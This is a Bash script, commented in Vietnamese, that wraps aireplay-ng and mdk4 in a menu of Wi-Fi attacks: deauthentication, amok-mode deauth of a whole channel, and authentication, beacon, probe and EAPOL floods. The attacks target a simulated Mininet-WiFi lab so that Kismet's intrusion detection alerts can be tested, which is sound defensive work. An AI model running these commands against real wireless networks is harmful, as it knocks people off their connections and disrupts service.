#!/bin/bash
# kali_wids_attacks.sh
# Script tự động hóa các công cụ thực tế trên Kali (aireplay-ng, mdk4) 
# để tấn công vào topo Mininet-WiFi nhằm kiểm thử Kismet WIDS.

# Giao diện tấn công (sử dụng wlan14 vì wlan15 đang được Kismet dùng để lắng nghe)
ATTACK_IFACE="wlan14"
# Kênh tấn công (phải là kênh 11 vì Kismet hiện đang bị lock ở kênh 11)
CHANNEL="11"

# Các BSSID mục tiêu trên kênh 11 (dựa theo code topo của bạn)
# AP3: Company-Guest (CH 11)
TARGET_BSSID_1="02:00:00:00:1e:00" 
# AP4: Rogue AP (Company-WiFi giả mạo - CH 11)
TARGET_BSSID_2="02:00:00:00:1f:00"  

# Kiểm tra quyền root
if [ "$EUID" -ne 0 ]; then
  echo "Vui lòng chạy script bằng quyền root (sudo)!"
  exit 1
fi

echo "=========================================================="
echo "   KỊCH BẢN TẤN CÔNG THỰC TẾ TRÊN KALI (AIRCRACK-NG/MDK4) "
echo "=========================================================="

echo "[*] Đang thiết lập $ATTACK_IFACE sang chế độ Monitor ở kênh $CHANNEL..."
ip link set $ATTACK_IFACE down
iw dev $ATTACK_IFACE set type monitor
ip link set $ATTACK_IFACE up
iw dev $ATTACK_IFACE set channel $CHANNEL
echo "[+] $ATTACK_IFACE đã sẵn sàng ở Monitor Mode (Kênh $CHANNEL)."
echo ""

echo "Vui lòng chọn kịch bản tấn công muốn chạy (Nhập số tương ứng):"
echo "  1) Deauthentication Attack (aireplay-ng) - Ngắt kết nối một AP mục tiêu"
echo "  2) Authentication Flood DoS (mdk4) - Gửi hàng loạt yêu cầu xác thực giả mạo"
echo "  3) Beacon Flood (mdk4) - Tạo hàng ngàn sóng Wi-Fi giả mạo (Fake APs)"
echo "  4) Amok Mode Deauth (mdk4) - Ngắt kết nối TẤT CẢ thiết bị trên kênh $CHANNEL"
echo "  5) Probe Request Flood (mdk4) - Gửi bão Probe Request dò tìm SSID"
echo "  6) EAPOL Start Flood (mdk4) - Tấn công quá tải WPA/WPA2-Enterprise"
echo "  7) WIDS/WIPS Confusion (mdk4) - Gửi các gói tin dị thường để qua mặt/kiểm tra WIDS"
echo "  8) Thoát"
echo "=========================================================="
read -p "Lựa chọn của bạn: " choice

case $choice in
    1)
        echo "[*] Đang chạy Deauth Attack (Broadcast) vào BSSID: $TARGET_BSSID_1..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Lệnh aireplay-ng -0 (Deauth) 0 (Gửi liên tục), -a (BSSID mục tiêu)
        aireplay-ng -0 0 -a $TARGET_BSSID_1 $ATTACK_IFACE
        ;;
    2)
        echo "[*] Đang chạy Auth Flood DoS Attack vào BSSID: $TARGET_BSSID_1..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Lệnh mdk4 với module 'a' (Authentication DoS), -a (BSSID), -m (dùng MAC client hợp lệ nếu có)
        mdk4 $ATTACK_IFACE a -a $TARGET_BSSID_1 -m
        ;;
    3)
        echo "[*] Đang chạy Beacon Flood..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Lệnh mdk4 với module 'b' (Beacon Flood), -c (Kênh)
        mdk4 $ATTACK_IFACE b -c $CHANNEL
        ;;
    4)
        echo "[*] Đang chạy Amok Mode Deauth trên kênh $CHANNEL..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Module 'd' deauth tất cả
        mdk4 $ATTACK_IFACE d -c $CHANNEL
        ;;
    5)
        echo "[*] Đang chạy Probe Request Flood..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Module 'p' spam probe request
        mdk4 $ATTACK_IFACE p -e "Company-WiFi"
        ;;
    6)
        echo "[*] Đang chạy EAPOL Start Flood vào BSSID: $TARGET_BSSID_1..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Module 'e' spam EAPOL Start
        mdk4 $ATTACK_IFACE e -t $TARGET_BSSID_1
        ;;
    7)
        echo "[*] Đang chạy WIDS/WIPS Confusion / Fuzzing..."
        echo "[!] Nhấn Ctrl+C để dừng."
        # Module 'w' WIDS/WIPS Confusion
        mdk4 $ATTACK_IFACE w -e "Company-WiFi" -c $CHANNEL
        ;;
    8)
        echo "Thoát. Chúc bạn kiểm thử thành công!"
        exit 0
        ;;
    *)
        echo "Lựa chọn không hợp lệ!"
        ;;
esac

echo "[+] Đã thực hiện xong lệnh tấn công."
echo "=> Vui lòng xem bảng điều khiển Kismet (đang lắng nghe trên wlan15) để kiểm tra cảnh báo WIDS."
